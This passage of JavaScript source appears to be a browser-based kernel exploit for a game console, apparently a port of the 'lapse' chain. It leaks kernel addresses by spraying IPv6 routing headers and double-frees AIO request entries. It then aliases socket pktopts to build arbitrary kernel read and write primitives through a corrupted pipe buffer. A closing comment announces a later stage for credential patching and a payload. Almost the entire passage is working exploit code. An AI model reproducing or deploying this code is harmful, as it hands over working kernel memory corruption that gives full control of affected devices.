    leakReqs.dv.setUint32(0x10, ucredP.low >>> 0, true);
    leakReqs.dv.setUint32(0x14, ucredP.hi >>> 0, true);
    const numLoop = NUM_SDS;
    const leakIdsLen = numLoop * numElems;
    const leakIds = alloc(4 * leakIdsLen);
    const step = 4 * numElems;
    const cmd = AIO_CMD_WRITE | AIO_CMD_FLAG_MULTI;

    let reqs2Off = null, fakeReqs3Off = null, fakeSd = -1, fakeReqs3Sd = -1;
    for (let attempt = 1; attempt <= NUM_LEAKS; ++attempt) {
        trace("REQS2-HUNT", `attempt=${attempt}/${NUM_LEAKS}`);
        for (let j = 1; j <= numLoop; ++j) {
            wbuf.dv.setUint32(8, j, true);
            submitCmd(cmd, leakReqs, numElems, 3, idSlice(leakIds, (j - 1) * step));
            writeRthdr(sockList[j - 1], wbuf, rsize);
        }
        /* capacity 0x800, no minimum: the rthdr copyout is 0x78 bytes
           however large a buffer we offer, so gating on 0x80 rejects
           every read (same trap as the EVF loop above). */
        if (readRthdr(masterSd, buflen) >= 0) {
            reqs2Off = null; fakeReqs3Off = null;
            for (let off = 0x80; off + 0x80 <= buflen; off += 0x80) {
                const base = {
                    dv: new DataView(leakDv.buffer, leakDv.byteOffset + off),
                };
                if (reqs2Off === null && verifyReqs2(base, AIO_CMD_WRITE))
                    reqs2Off = off;
                if (fakeReqs3Off === null
                    && (base.dv.getUint32(4, true) >>> 0) === MARKER) {
                    fakeReqs3Off = off;
                    fakeSd = base.dv.getUint32(8, true) >>> 0;
                }
            }
            if (reqs2Off !== null && fakeReqs3Off !== null && fakeSd > 0) {
                mark("REQS2-LEAKED", `attempt=${attempt}`
                    + ` reqs2=0x${reqs2Off.toString(16)}`
                    + ` fake_reqs3=0x${fakeReqs3Off.toString(16)}`
                    + ` sd_idx=${fakeSd}`);
                /* The value at +8 is the reference's sd_idx (the 1-based
                   loop counter written into wbuf+8), NOT an fd. Resolve it
                   to the real socket, splice that socket out of the live
                   pool, release every remaining rthdr so those chunks stop
                   competing for the freed one, and refill the pool to
                   NUM_SDS -- exactly what the reference's leak_kernel_addrs
                   does on a hit (lapse-vue.js:949-955). */
                const idx = fakeSd - 1;
                if (idx >= 0 && idx < sockList.length && sockList[idx] > 0) {
                    fakeReqs3Sd = sockList[idx];
                    sockList.splice(idx, 1);
                    for (const fd of sockList) {
                        if (fd > 0) freeRthdr(fd);
                    }
                    const fresh = newUdp6();
                    sockList.push(fresh);
                    mark("FAKE-REQS3-SD", `fd=${fakeReqs3Sd}`
                        + ` freed_others=${sockList.length}`);
                } else {
                    mark("FAKE-REQS3-SD-MISS", `sd_idx=${fakeSd}`
                        + ` list=${sockList.length}`);
                }
                break;
            }
        }
        cancelAios(leakIds, leakIdsLen);
        if (!(attempt % 4)) await forceYield();
    }
    if (!check("reqs2-and-fake-reqs3-leaked",
        reqs2Off !== null && fakeReqs3Off !== null,
        `reqs2=${reqs2Off} fake_reqs3=${fakeReqs3Off}`)) return false;

    // ---- pull the real pointers out of the leaked reqs2 entry ----
    const r2 = function (o) {
        return new int64(leakDv.getUint32(reqs2Off + o, true),
            leakDv.getUint32(reqs2Off + o + 4, true));
    };
    aioInfoAddr = r2(0x18);
    // reqs1 is the kbuf page this aio_entry was carved from: clear the low
    // byte so we point at the page base, exactly as the reference's
    // `& 0xFFFFFFFF_FFFFFF00` mask does.
    const r1raw = r2(0x10);
    reqs1Addr = new int64(r1raw.low & 0xffffff00, r1raw.hi >>> 0);
    const fakeReqs3Addr = kbufAddr.add32(fakeReqs3Off + R3);
    mark("LEAKED-ADDRS", `aio_info=${aioInfoAddr}`
        + ` reqs1=${reqs1Addr} fake_reqs3=${fakeReqs3Addr}`);
    if (!check("leaked-pointers-are-kernel",
        isKernelPtr(aioInfoAddr) && isKernelPtr(reqs1Addr),
        `aio_info=${aioInfoAddr} reqs1=${reqs1Addr}`)) return false;

    // ---- target_id: cancel batch by batch until reqs2 state = ABORTED ----
    let targetId = null, cancelFrom = -1;
    const numElems2 = 6;
    const errors = alloc(4 * numElems2);
    for (let i = 0; i + numElems2 <= leakIdsLen; i += numElems2) {
        multiCancel(idSlice(leakIds, i), numElems2, errors);
        if (readRthdr(masterSd, buflen) < 0) continue;
        const st = leakDv.getUint32(reqs2Off + 0x38, true) >>> 0;
        if (st === AIO_STATE_ABORTED) {
            targetId = leakIds.dv.getUint32(i * 4, true) >>> 0;
            leakIds.dv.setUint32(i * 4, 0, true);
            cancelFrom = i + numElems2;
            mark("TARGET-ID-FOUND", `id=${hx(targetId)} at i=${i}`);
            break;
        }
        if ((i & 0x3f) === 0) await forceYield();
    }
    if (!check("target-id-found", targetId !== null,
        "no batch reached AIO_STATE_ABORTED")) return false;

    if (cancelFrom >= 0 && cancelFrom < leakIdsLen)
        cancelAios(idSlice(leakIds, cancelFrom), leakIdsLen - cancelFrom);
    freeAios(idSlice(leakIds, 0), leakIdsLen, false);

    leakOffsets.reqs2 = reqs2Off;
    leakOffsets.fakeReqs3 = fakeReqs3Off;
    leakOffsets.fakeSd = fakeSd;
    leakOffsets.fakeReqs3Sd = fakeReqs3Sd;
    leakOffsets.fakeReqs3Addr = fakeReqs3Addr;
    leakOffsets.targetId = targetId;
    leakOffsets.evf = evf;
    leakOffsets.masterSd = masterSd;
    leakOffsets.sockList = sockList;
    mark("LEAK-DONE", `reqs2=0x${reqs2Off.toString(16)}`
        + ` fake_reqs3=0x${fakeReqs3Off.toString(16)}`
        + ` aio_info=${aioInfoAddr} reqs1=${reqs1Addr}`
        + ` target_id=${hx(targetId)} evf=${evf}`);
    return true;
}

async function stageLeak() {
    state("stage 3: leaking kernel addresses...", "warn");

    const lenAb = alloc(8); lenAddr = lenAb.addr; lenDv = lenAb.dv;
    /* The leak buffer must hold the full rthdr copyout: reads go up to
       buflen (0x80 * LEAK_LEN = 0x800). A 0x168 buffer here would let the
       kernel copyout run past our ArrayBuffer. */
    const leakAb = alloc(0x80 * LEAK_LEN + 0x100);
    leakAddr = leakAb.addr; leakDv = leakAb.dv;
    leakU8 = leakAb.u8;
    /* spray payload keeps the reference's 0x168 pktopts-sized shape */
    const sprayAb = alloc(0x168); sprayAddr = sprayAb.addr; sprayDv = sprayAb.dv;
    sprayLen = buildRthdr0(sprayDv, 0x168);
    const scratchAb = alloc(0x1000); scratch = scratchAb.addr;
    shortReads = 0;

    /* STUB PRE-FLIGHT. discoverStubs matches a byte signature and will
       happily bind a syscall to unrelated code that carries it; the log
       showed missing=[] while scanned=48, i.e. every number found
       SOMETHING. A wrong stub for evf_create/clear/set/delete pivots the
       kernel into junk and hard-freezes the page before a single EVF-*
       line prints -- which is exactly where this stage stopped.

       So call each one once, now, and check it behaves. A real evf_create
       returns a small positive handle; a bad stub gives a negative
       errno-ish value or garbage. */
    {
        const name1 = alloc(1);
        const probe = [
            ["evf_create", () => sc(SYS.evf_create, name1.addr, 0, 0xf00).i32],
            ["getpid", () => sc(SYS.getpid).i32],
            ["getsockopt", () => sc(SYS.getsockopt, triplets.a,
                COMMON.IPPROTO_IPV6, COMMON.IPV6_RTHDR, leakAddr, lenAddr).i32],
        ];
        let bad = null;
        for (const [nm] of probe) {
            const num = nm === "evf_create" ? SYS.evf_create
                : nm === "getpid" ? SYS.getpid : SYS.getsockopt;
            if (!stubAddr.has(num)) { bad = nm + "(no stub)"; break; }
        }
        if (bad) {
            mark("STUB-PREFLIGHT-BAD", bad);
            check("stub-preflight-ok", false, bad);
            return false;
        }
        lenDv.setUint32(0, 0x80, true);
        const h = probe[0][1]();
        mark("STUB-PREFLIGHT", "evf_create -> " + h);
        if (!(h > 0 && h < 0x10000)) {
            mark("STUB-PREFLIGHT-BAD", "evf_create returned " + h
                + " -- not a usable handle, refusing to enter the EVF loop");
            check("stub-preflight-ok", false, "evf_create=" + h);
            return false;
        }
        freeEvf(h);
        check("stub-preflight-ok", true, "evf_create=" + h);
    }

    const ok = await leakKernelAddrs(triplets, sds);
    mark("SHORT-READS", `n=${shortReads} gate=${R2_ON ? 1 : 0}`);
    return ok;
}
/* =====================================================================
 * STAGE 4 -- make_kernel_arw.
 *
 * lapse's own ARW, NOT netctrl's fake-uio. The carrier is an aliased
 * pktopts:
 *
 *   - an ip6po_pktinfo pointer is placed at pktopts+0x10 so the socket
 *     reads its own pktinfo back out of the object we control
 *   - the twin is closed and sds_alt is sprayed until a socket reclaims
 *     the freed pktopts (proved by reading IPV6_TCLASS back through the
 *     master and finding the 0x4141|idx tag)
 *   - after that, master's pktinfo pointer is redirected at the victim's,
 *     so getsockopt(IPV6_PKTINFO) on worker reads 0x14 bytes from an
 *     arbitrary kernel address and setsockopt writes them back
 *
 * The last two steps (copyout/copyin) overwrite struct pipe's buffer
 * pointer, which is what upgrades kread8/kwrite8 into full buffer r/w.
 * ===================================================================== */

function getFdDataAddr(sock) {
    const fde = curprocOfiles.add32((sock >>> 0) * SIZEOF_OFILES);
    const file = kernelRead8(fde);
    if (!file || !isKernelPtr(file)) return null;
    return kernelRead8(file);
}

function getSockPktopts(sock) {
    if (!curprocOfiles) return null;
    const fdData = getFdDataAddr(sock);
    if (!fdData || !isKernelPtr(fdData)) return null;
    const pcb = kernelRead8(fdData.add32(SO_PCB));
    if (!pcb || !isKernelPtr(pcb)) return null;
    return kernelRead8(pcb.add32(INPCB_PKTOPTS));
}

async function makeKernelArw(pktoptsPair, sockList, sockListAlt) {
    masterSock = pktoptsPair[0];

    const tclass = alloc(4);
    const pktinfoLen = 0x14;
    const pktoptsSize = 0x100;
    const pktopts = alloc(pktoptsSize);
    const rsize = buildRthdr0(pktopts.dv, pktoptsSize);
    const pktinfoP = reqs1Addr.add32(0x10);

    // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
    pktopts.dv.setUint32(0x10, pktinfoP.low >>> 0, true);
    pktopts.dv.setUint32(0x14, pktinfoP.hi >>> 0, true);

    sc(SYS.close, pktoptsPair[1]);

    // ---- reclaim the freed main pktopts ----
    reclaimSock = -1;
    for (let attempt = 1; attempt <= NUM_ALIAS && reclaimSock < 0; ++attempt) {
        trace("PKTOPTS-RECLAIM-ROUND", `attempt=${attempt}/${NUM_ALIAS}`);
        for (let j = 0; j < sockListAlt.length; ++j) {
            pktopts.dv.setUint32(IP6PO_TCLASS, 0x4141 | (j << 16), true);
            writeRthdr(sockListAlt[j], pktopts, rsize);
        }
        const lp = alloc(4);
        lp.dv.setUint32(0, 4, true);
        if (sc(SYS.getsockopt, masterSock, COMMON.IPPROTO_IPV6,
            IPV6_TCLASS /* 61 */, tclass.addr, lp.addr).i32 < 0) {
            await forceYield();
            continue;
        }
        const marker = tclass.dv.getUint32(0, true) >>> 0;
        if ((marker & 0xffff) === 0x4141) {
            const idx = (marker >>> 16) & 0xffff;
            reclaimSock = sockListAlt[idx];
            sockListAlt.splice(idx, 1);
            mark("PKTOPTS-RECLAIMED", `attempt=${attempt} sd=${reclaimSock}`);
        }
        await forceYield();
    }
    if (!check("main-pktopts-reclaimed-by-alt-socket", reclaimSock >= 0,
        `no reclaim in ${NUM_ALIAS} attempts`)) return false;

    // ---- pktinfo pair used for the read/write window ----
    const pktinfo = alloc(pktinfoLen);
    pktinfo.dv.setUint32(0, pktinfoP.low >>> 0, true);
    pktinfo.dv.setUint32(4, pktinfoP.hi >>> 0, true);
    const readBuf = alloc(16);

    /* Read a NUL-terminated string out of a USERLAND buffer (readBuf), not
       out of kernel memory. readBuf was filled with the 8 bytes
       slowKread8/kernelRead8 copied out of the kernel, so walking its
       bytes with p.read1() recovers the string those bytes encode. */
    function readCString(userAddr, maxLen) {
        let s = "";
        const cap = maxLen === undefined ? 64 : maxLen;
        for (let i = 0; i < cap; ++i) {
            const c = p.read1(userAddr.add32(i)) & 0xff;
            if (c === 0) break;
            s += String.fromCharCode(c);
        }
        return s;
    }

    function slowKread8(addr) {
        const out = alloc(8);
        let offset = 0;
        while (offset < 8) {
            pktinfo.dv.setUint32(8, addr.add32(offset).low >>> 0, true);
            pktinfo.dv.setUint32(12, addr.add32(offset).hi >>> 0, true);
            sc(SYS.setsockopt, masterSock, COMMON.IPPROTO_IPV6,
                IPV6_PKTINFO /* 46 */, pktinfo.addr, pktinfoLen);
            const lp = alloc(4);
            lp.dv.setUint32(0, 8 - offset, true);
            const n = sc(SYS.getsockopt, masterSock, COMMON.IPPROTO_IPV6,
                IPV6_NEXTHOP /* 48 */, out.addr.add32(offset), lp.addr).i32;
            if (n <= 0) offset += 1;
            else offset += n;
        }
        return new int64(out.dv.getUint32(0, true), out.dv.getUint32(4, true));
    }

    // sanity: read the "evf cv" string back through the primitive
    const cv = slowKread8(kernelAddr);
    readBuf.dv.setUint32(0, cv.low >>> 0, true);
    readBuf.dv.setUint32(4, cv.hi >>> 0, true);
    const kstr = readCString(readBuf.addr);
    mark("ARW-SLOW-READ-TEST", `"evf cv" -> "${kstr}"`);
    if (!check("slow-kread-reads-evf-cv-string", kstr === "evf cv",
        `got "${kstr}"`)) return false;

    // ---- curproc from the freed aio_info, verified against getpid ----
    const proc = slowKread8(aioInfoAddr.add32(8));
    if (!isKernelPtr(proc)) {
        mark("ARW-BAD-CURPROC", "" + proc);
        return false;
    }
    const gotPid = slowKread8(proc.add32(PROC_PID));
    const myPid = sc(SYS.getpid).i32;
    const pidOk = (gotPid.low >>> 0) === (myPid >>> 0);
    if (!check("curproc-verified-by-p_pid", pidOk,
        `p_pid=${gotPid.low >>> 0} getpid=${myPid >>> 0}`)) return false;
    mark("CURPROC", "" + proc);

    const procFd2 = slowKread8(proc.add32(PROC_FD));
    curprocOfiles = slowKread8(procFd2).add32(FILEDESC_OFILES);

    /* kernelBase = the evf cv address minus its RVA. k_evf_cv is the
       same offset netctrl derives kernel_base from, and it is the
       EVFSIZ/event-flag RVA in this firmware's table. */
    kernelArwCurproc = proc;
    kernelArwBase = kernelAddr.sub32(off.k_evf_cv);
    mark("KERNEL-BASE", kernelArwBase + ` = evf_cv-0x`
        + off.k_evf_cv.toString(16));
    check("kernel-base-0x4000-aligned",
        ((kernelArwBase.low & 0x3fff) >>> 0) === 0,
        "low=" + hx(kernelArwBase.low));

    // ---- build the worker/victim pair and overlap their pktinfo ----
    const workerPktinfo = alloc(pktinfoLen);
    workerSock = sc(SYS.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).i32;
    if (workerSock < 0) {
        mark("ARW-WORKER-SOCK-FAILED", `rc=${workerSock}`);
        return false;
    }
    sc(SYS.setsockopt, workerSock, COMMON.IPPROTO_IPV6,
        IPV6_PKTINFO, workerPktinfo.addr, pktinfoLen);
    workerPktopts = getSockPktopts(workerSock);
    masterPktopts = getSockPktopts(masterSock);
    if (!check("pktopts-pointers-are-kernel",
        isKernelPtr(workerPktopts) && isKernelPtr(masterPktopts),
        `worker=${workerPktopts} master=${masterPktopts}`)) return false;

    // overlap: master's pktinfo now points where the real object is
    pktinfo.dv.setUint32(0, workerPktopts.add32(0x10).low >>> 0, true);
    pktinfo.dv.setUint32(4, workerPktopts.add32(0x10).hi >>> 0, true);
    pktinfo.dv.setUint32(8, 0, true);
    pktinfo.dv.setUint32(12, 0, true);
    sc(SYS.setsockopt, masterSock, COMMON.IPPROTO_IPV6,
        IPV6_PKTINFO, pktinfo.addr, pktinfoLen);

    function kread20(addr, buf) {
        buf.dv.setUint32(0, addr.low >>> 0, true);
        buf.dv.setUint32(4, addr.hi >>> 0, true);
        sc(SYS.setsockopt, masterSock, COMMON.IPPROTO_IPV6,
            IPV6_PKTINFO, buf.addr, pktinfoLen);
        const lp = alloc(4);
        lp.dv.setUint32(0, pktinfoLen, true);
        sc(SYS.getsockopt, workerSock, COMMON.IPPROTO_IPV6,
            IPV6_PKTINFO, buf.addr, lp.addr);
    }
    function kwrite20(addr, buf) {
        buf.dv.setUint32(0, addr.low >>> 0, true);
        buf.dv.setUint32(4, addr.hi >>> 0, true);
        sc(SYS.setsockopt, masterSock, COMMON.IPPROTO_IPV6,
            IPV6_PKTINFO, buf.addr, pktinfoLen);
        sc(SYS.setsockopt, workerSock, COMMON.IPPROTO_IPV6,
            IPV6_PKTINFO, buf.addr, pktinfoLen);
    }
    kernelRead8 = function (addr) {
        kread20(addr, workerPktinfo);
        return new int64(workerPktinfo.dv.getUint32(0, true),
            workerPktinfo.dv.getUint32(4, true));
    };
    kernelWrite8 = function (addr, val) {
        const v = toI64(val);
        workerPktinfo.dv.setUint32(0, v.low >>> 0, true);
        workerPktinfo.dv.setUint32(4, v.hi >>> 0, true);
        workerPktinfo.dv.setUint32(8, 0, true);
        workerPktinfo.dv.setUint32(12, 0, true);
        workerPktinfo.dv.setUint32(16, 0, true);
        kwrite20(addr, workerPktinfo);
    };

    const check8 = kernelRead8(kernelAddr);
    readBuf.dv.setUint32(0, check8.low >>> 0, true);
    readBuf.dv.setUint32(4, check8.hi >>> 0, true);
    const kstr2 = readCString(readBuf.addr);
    if (!check("restricted-kread-reads-evf-cv", kstr2 === "evf cv",
        `got "${kstr2}"`)) return false;
    mark("ARW-RESTRICTED", "restricted kernel r/w achieved");

    // ---- pipe pair, then copyout/copyin ----
    const pfd = alloc(8);
    if (sc(SYS.pipe, pfd.addr).i32 === -1) {
        mark("ARW-PIPE-FAILED", "");
        return false;
    }
    pipeReadFd = pfd.dv.getInt32(0, true);
    pipeWriteFd = pfd.dv.getInt32(4, true);
    pipeAddr = getFdDataAddr(pipeReadFd);
    if (!check("pipe-fd-data-is-kernel-pointer", isKernelPtr(pipeAddr),
        "" + pipeAddr)) return false;
    pipeMapBuf = alloc(pktinfoLen);
    readMem = alloc(PAGE_SIZE_);

    kernelCopyout = function (kaddr, uaddr, len) {
        pipeMapBuf.dv.setUint32(0, 0x40000000, true);
        pipeMapBuf.dv.setUint32(4, 0x40000000, true);
        pipeMapBuf.dv.setUint32(8, 0x40000000, true);
        pipeMapBuf.dv.setUint32(12, 0, true);
        pipeMapBuf.dv.setUint32(16, 0, true);
        kernelWrite8(pipeAddr, new int64(pipeMapBuf.dv.getUint32(0, true),
            pipeMapBuf.dv.getUint32(4, true)));
        pipeMapBuf.dv.setUint32(0, kaddr.low >>> 0, true);
        pipeMapBuf.dv.setUint32(4, kaddr.hi >>> 0, true);
        pipeMapBuf.dv.setUint32(8, 0, true);
        pipeMapBuf.dv.setUint32(12, 0, true);
        pipeMapBuf.dv.setUint32(16, 0, true);
        kwrite20(pipeAddr.add32(0x10), pipeMapBuf);
        sc(SYS.read, pipeReadFd, uaddr, len);
    };
    kernelCopyin = function (uaddr, kaddr, len) {
        pipeMapBuf.dv.setUint32(0, 0, true);
        pipeMapBuf.dv.setUint32(4, 0, true);
        pipeMapBuf.dv.setUint32(8, 0x40000000, true);
        pipeMapBuf.dv.setUint32(12, 0, true);
        pipeMapBuf.dv.setUint32(16, 0, true);
        kernelWrite8(pipeAddr, new int64(pipeMapBuf.dv.getUint32(0, true),
            pipeMapBuf.dv.getUint32(4, true)));
        pipeMapBuf.dv.setUint32(0, kaddr.low >>> 0, true);
        pipeMapBuf.dv.setUint32(4, kaddr.hi >>> 0, true);
        pipeMapBuf.dv.setUint32(8, 0, true);
        pipeMapBuf.dv.setUint32(12, 0, true);
        pipeMapBuf.dv.setUint32(16, 0, true);
        kwrite20(pipeAddr.add32(0x10), pipeMapBuf);
        sc(SYS.write, pipeWriteFd, uaddr, len);
    };

    kernelReadBuffer = function (kaddr, len) {
        const mem = (len > PAGE_SIZE_) ? alloc(len) : readMem;
        kernelCopyout(kaddr, mem.addr, len);
        const out = new Uint8Array(len);
        for (let i = 0; i < len; ++i) out[i] = mem.u8[i];
        return out;
    };
    kernelWriteBuffer = function (kaddr, bytes) {
        const tmp = alloc(bytes.length);
        for (let i = 0; i < bytes.length; ++i) tmp.u8[i] = bytes[i];
        kernelCopyin(tmp.addr, kaddr, bytes.length);
    };
    kernelReadCString = function (addr) {
        let s = "";
        for (let i = 0; i < 256; ++i) {
            const c = kernelReadBuffer(addr.add32(i), 1)[0];
            if (c === 0) break;
            s += String.fromCharCode(c);
        }
        return s;
    };

    const kstr3 = kernelReadCString(kernelAddr);
    if (!check("arbitrary-kernel-rw-reads-evf-cv", kstr3 === "evf cv",
        `got "${kstr3}"`)) return false;
    mark("ARW-ARBITRARY", "arbitrary kernel r/w achieved");

    // ---- restore: clear the rthdr pointers we corrupted ----
    for (const fd of sockList) {
        const pk = getSockPktopts(fd);
        if (pk && isKernelPtr(pk)) kernelWrite8(pk.add32(IP6PO_RTHDR), new int64(0, 0));
    }
    for (const fd of [reclaimSock, workerSock]) {
        const pk = getSockPktopts(fd);
        if (pk && isKernelPtr(pk)) kernelWrite8(pk.add32(IP6PO_RTHDR), new int64(0, 0));
    }
    // hold reference counts so nothing we still need gets freed under us
    for (const fd of [masterSock, workerSock, reclaimSock]) {
        const so = getFdDataAddr(fd);
        if (so && isKernelPtr(so)) kernelWrite8(so, new int64(0x100, 0));
    }
    mark("ARW-FIXES-APPLIED", "rthdr pointers cleared, refcounts held");
    return true;
}

/* Alias two sockets' pktopts onto one chunk. This is NOT the rthdr marker
   hunt -- it uses IPV6_TCLASS, which lives in the pktopts object itself,
   so tagging each socket's tclass and reading it back through every other
   socket finds the pair that share one pktopts. On the way out the two
   aliased fds are replaced with fresh sockets and every remaining socket
   has its 2292 pktopts flushed. */
function makeAliasedPktopts(sockList) {
    const tclass = alloc(4);
    for (let loop = 0; loop < NUM_ALIAS; ++loop) {
        for (let i = 0; i < sockList.length; ++i) {
            tclass.dv.setUint32(0, i, true);
            sc(SYS.setsockopt, sockList[i], COMMON.IPPROTO_IPV6,
                IPV6_TCLASS, tclass.addr, 4);
        }
        for (let i = 0; i < sockList.length; ++i) {
            const lp = alloc(4);
            lp.dv.setUint32(0, 4, true);
            sc(SYS.getsockopt, sockList[i], COMMON.IPPROTO_IPV6,
                IPV6_TCLASS, tclass.addr, lp.addr);
            const marker = tclass.dv.getUint32(0, true) >>> 0;
            if (marker !== i && marker < sockList.length) {
                const a = sockList[i], b = sockList[marker];
                mark("PKTOPTS-ALIASED", `attempt=${loop} pair=${a},${b}`);
                const hi = Math.max(marker, i), lo = Math.min(marker, i);
                sockList.splice(hi, 1);
                sockList.splice(lo, 1);
                for (let j = 0; j < 2; ++j) {
                    const fresh = sc(SYS.socket, AF_INET6, SOCK_DGRAM,
                        IPPROTO_UDP).i32;
                    if (fresh < 0) break;
                    sc(SYS.setsockopt, fresh, COMMON.IPPROTO_IPV6,
                        IPV6_TCLASS, tclass.addr, 4);
                    sockList.push(fresh);
                }
                return [a, b];
            }
        }
        for (let i = 0; i < sockList.length; ++i)
            sc(SYS.setsockopt, sockList[i], COMMON.IPPROTO_IPV6,
                IPV6_2292PKTOPTIONS, 0, 0);
    }
    return null;
}

/* ---- stage 4b: double_free_reqs1 -------------------------------------
 * The SECOND AIO double-free. Stage 3 left us a verified aio_entry
 * (reqs2) and a usable evf; this stage turns that into an aliased pktopts
 * pair, which is what make_kernel_arw needs as its carrier.
 *
 *   1. free the evf, then spray AIO queue entries until one lands on the
 *      rthdr chunk (detected by a short 8-byte readback whose cmd word
 *      is AIO_CMD_READ)
 *   2. forge a reqs2 with ar2_ticket=5, ar2_info=reqs1, ar2_batch=fake_reqs3
 *   3. close sd, then spray rthdr over the frozen AIO entry until a
 *      cancel reports AIO_STATE_COMPLETE -- that names req_id
 *   4. aio_multi_delete([req_id, target_id]) -- both frees hit the same
 *      queue_ent[]
 *   5. make_aliased_pktopts() reclaims it
 */
async function doubleFreeReqs1(reqs1, targetId, evf, sd, sockList, altList,
    fakeReqs3Addr) {
    /* 0x800 is the reference's max leak length. There is no local buf:
       every read goes through readRthdr(), which lands in leakDv, and
       the checks below read leakDv[0]. */
    const maxLeakLen = (0xff + 1) << 3;
    const numElems = MAX_AIO_IDS;
    const aioReqs = makeReqs(numElems);
    const numBatches = 1;
    const aioIdsLen = numBatches * numElems;
    const aioIds = alloc(4 * aioIdsLen);

    // ---- 1. evf out, AIO queue entry in ----
    freeEvf(evf);
    let found = false;
    for (let i = 0; i < NUM_CLOBBERS && !found; ++i) {
        sprayAio(numBatches, aioReqs, numElems, aioIds, true, AIO_CMD_READ);
        if (readRthdr(sd, maxLeakLen) >= 0) {
            const cmd = leakDv.getUint32(0, true) >>> 0;
            if (cmd === AIO_CMD_READ) {
                mark("AIO-ALIASED", `attempt=${i}`);
                found = true;
                cancelAios(aioIds, aioIdsLen);
                break;
            }
        }
        freeAios(aioIds, aioIdsLen, true);
        await forceYield();
    }
    if (!check("aio-entry-aliased-over-rthdr", found,
        `no clobber in ${NUM_CLOBBERS} attempts`)) return null;

    // ---- 2. forge reqs2 ----
    const reqs2Size = 0x80;
    const reqs2 = alloc(reqs2Size);
    const rsize = buildRthdr0(reqs2.dv, reqs2Size);
    reqs2.dv.setUint32(4, 5, true);                       // ar2_ticket
    reqs2.dv.setUint32(0x18, reqs1.low >>> 0, true);      // ar2_info
    reqs2.dv.setUint32(0x1c, reqs1.hi >>> 0, true);
    reqs2.dv.setUint32(0x20, fakeReqs3Addr.low >>> 0, true); // ar2_batch
    reqs2.dv.setUint32(0x24, fakeReqs3Addr.hi >>> 0, true);

    const states = alloc(4 * numElems);
    const addrCache = [];
    for (let b = 0; b < numBatches; ++b) addrCache.push(idSlice(aioIds, b * numElems * 4));

    // ---- 3. rthdr over the frozen AIO entry, hunt req_id ----
    sc(SYS.close, sd);
    let reqId = null;
    for (let i = 0; i < NUM_ALIAS && reqId === null; ++i) {
        trace("REQ-ID-HUNT", `loop=${i}/${NUM_ALIAS}`);
        for (let j = 0; j < sockList.length; ++j)
            writeRthdr(sockList[j], reqs2, rsize);
        for (let b = 0; b < addrCache.length && reqId === null; ++b) {
            for (let k = 0; k < numElems; ++k)
                states.dv.setUint32(k * 4, 0xffff, true);
            multiCancel(addrCache[b], numElems, states);
            let reqIdx = -1;
            for (let k = 0; k < numElems; ++k)
                if ((states.dv.getUint32(k * 4, true) >>> 0) === AIO_STATE_COMPLETE) {
                    reqIdx = k; break;
                }
            if (reqIdx !== -1) {
                const aioIdx = b * numElems + reqIdx;
                const reqIdP = idSlice(aioIds, aioIdx * 4);
                multiPoll(reqIdP, 1, states);
                reqId = aioIds.dv.getUint32(aioIdx * 4, true) >>> 0;
                aioIds.dv.setUint32(aioIdx * 4, 0, true);
                mark("REQ-ID-FOUND", `id=${hx(reqId)} batch=${b} attempt=${i}`);
            }
        }
        await forceYield();
    }
    if (!check("req-id-found-by-state-complete", reqId !== null,
        `no COMPLETE state in ${NUM_ALIAS} loops`)) return null;

    freeAios(aioIds, aioIdsLen, false);

    // ---- 4. the double free ----
    const targetIdP = alloc(4);
    targetIdP.dv.setUint32(0, targetId >>> 0, true);
    multiPoll(targetIdP, 1, states);

    const sceErrs = alloc(8);
    sceErrs.dv.setUint32(0, 0xffff, true);
    sceErrs.dv.setUint32(4, 0xffff, true);
    const targetIds = alloc(8);
    targetIds.dv.setUint32(0, reqId >>> 0, true);
    targetIds.dv.setUint32(4, targetId >>> 0, true);

    multiDelete(targetIds, 2, sceErrs);
    const pair = makeAliasedPktopts(altList);

    const err1 = sceErrs.dv.getInt32(0, true);
    const err2 = sceErrs.dv.getInt32(4, true);
    states.dv.setUint32(0, 0xffff, true);
    states.dv.setUint32(4, 0xffff, true);
    multiPoll(targetIds, 2, states);
    const st0 = states.dv.getInt32(0, true);

    mark("DOUBLE-FREE-RESULT", `err1=${err1} err2=${err2} poll=${hx(st0)}`);
    const delOk = (st0 === SCE_KERNEL_ERROR_ESRCH) && err1 === 0 && err1 === err2;
    check("reqs1-double-freed", delOk, `poll=${hx(st0)} errs=${err1}/${err2}`);
    if (!delOk) return null;
    if (!check("aliased-pktopts-made", !!pair, "")) return null;
    return pair;
}

async function stageArw() {
    state("stage 4: make_kernel_arw...", "warn");

    // fresh sockets for the pktopts reclaim pool
    const alt = [];
    for (let i = 0; i < 48; ++i) {
        const sd = sc(SYS.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).i32;
        if (sd < 0) break;
        alt.push(sd);
    }
    mark("ARW-ALT-SOCKETS", `n=${alt.length}`);
    if (!check("arw-alt-socket-pool", alt.length >= 8,
        alt.length + "/48")) return false;

    // The carrier pair does NOT come from a second marker hunt -- it comes
    // out of double_free_reqs1, which frees the corrupt reqs1 aio_entry
    // twice and then reclaims it as an aliased pktopts. Stage 3 handed us
    // reqs1Addr / targetId / evf / masterSd for it.
    const pair = await doubleFreeReqs1(reqs1Addr, leakOffsets.targetId,
        leakOffsets.evf, leakOffsets.masterSd, sds, alt,
        leakOffsets.fakeReqs3Addr);
    /* Close the fake-reqs3 socket the leak stage set aside -- the
       reference does exactly this immediately after the stage-3 double
       free returns (lapse-vue.js:1593), releasing the chunk the forged
       reqs3 lives on before the ARW stage maps the carrier. */
    if (leakOffsets.fakeReqs3Sd > 0) {
        sc(SYS.close, leakOffsets.fakeReqs3Sd);
        mark("FAKE-REQS3-SD-CLOSED", `fd=${leakOffsets.fakeReqs3Sd}`);
        leakOffsets.fakeReqs3Sd = -1;
    }
    if (!pair) {
        check("aliased-pktopts-pair-found", false, "double_free_reqs1 failed");
        return false;
    }
    mark("PKTOPTS-SDS", "pair=" + pair.join(","));

    const ok = await makeKernelArw(pair, sds.slice(), alt);
    return ok;
}
/* =====================================================================
 * STAGE 5 -- credentials, kernel patch, payload.
 *
 * prison0 and rootvnode come from the kProc walk, NOT from a static RVA.
 * This file runs in the Internet Browser (libkernel_web.sprx), so the
 * libkernel.sprx data RVAs the vue reference uses address the wrong
 * layout here -- see the header. kProc is the only correct source.
 *
 *   kProc     <- walk p_list_next from curproc until p_pid == 0
 *   prison0   <- kProc.p_ucred(+0x40).cr_prison(+0x30)
 *   rootvnode <- kProc.p_fd(+0x48).fd_rdir(+0x10)
 * ===================================================================== */

